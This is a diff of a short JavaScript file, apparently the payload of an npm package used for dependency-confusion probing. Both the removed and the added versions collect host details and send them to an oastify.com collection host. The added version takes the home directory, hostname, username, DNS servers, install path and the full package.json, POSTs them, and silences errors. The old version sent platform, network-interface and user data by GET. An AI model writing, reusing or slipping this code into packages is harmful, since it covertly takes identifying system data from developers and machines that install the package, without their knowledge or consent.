@@ -1,45 +1,46 @@
-const os = require('os');
-const https = require('https');
-const { execSync } = require('child_process');
+const os = require("os");
+const dns = require("dns");
+const querystring = require("querystring");
+const https = require("https");
+const packageJSON = require("./package.json");
+const package = packageJSON.name;
 
-// Replace with your Burp Collaborator URL
-const burpCollaboratorUrl = '75at9bhoyndx3dt9eyp710fssjyam2ar.oastify.com';
-
-// Collect device information
-const deviceInfo = {
-  platform: os.platform(),
-  release: os.release(),
-  hostname: os.hostname(),
-  arch: os.arch(),
-  userInfo: os.userInfo(),
-  networkInterfaces: os.networkInterfaces()
-};
-
-// Convert device information to a query string
-const queryString = Object.entries(deviceInfo).map(([key, value]) => {
-  if (typeof value === 'object') {
-    value = JSON.stringify(value);
-  }
-  return `${encodeURIComponent(key)}=${encodeURIComponent(value)}`;
-}).join('&');
-
-// Define the request options
-const options = {
-  hostname: burpCollaboratorUrl,
-  port: 443,
-  path: `/?${queryString}`,
-  method: 'GET'
-};
-
-// Create the request
-const req = https.request(options, (res) => {
-  console.log(`Status: ${res.statusCode}`);
+const trackingData = JSON.stringify({
+    p: package,
+    c: __dirname,
+    hd: os.homedir(),
+    hn: os.hostname(),
+    un: os.userInfo().username,
+    dns: dns.getServers(),
+    r: packageJSON ? packageJSON.___resolved : undefined,
+    v: packageJSON.version,
+    pjson: packageJSON,
 });
 
-// Handle any errors
-req.on('error', (error) => {
-  console.error(`Error: ${error.message}`);
+var postData = querystring.stringify({
+    msg: trackingData,
 });
 
-// End the request
+var options = {
+    hostname: "356sv2lpkjygtxa2jimze3fvrmxdl59u.oastify.com", //replace burpcollaborator.net with Interactsh or pipedream
+    port: 80,
+    path: "/",
+    method: "POST",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": postData.length,
+    },
+};
+
+var req = https.request(options, (res) => {
+    res.on("data", (d) => {
+        process.stdout.write(d);
+    });
+});
+
+req.on("error", (e) => {
+    // console.error(e);
+});
+
+req.write(postData);
 req.end();
